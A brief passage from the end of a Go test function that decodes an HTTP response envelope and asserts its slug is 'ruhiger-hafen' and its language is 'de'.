	if m := decodeEnvelope(t, rr); m["slug"] != "ruhiger-hafen" || m["lang"] != "de" {
		t.Fatalf("cuerpo=%v", m)
	}
}
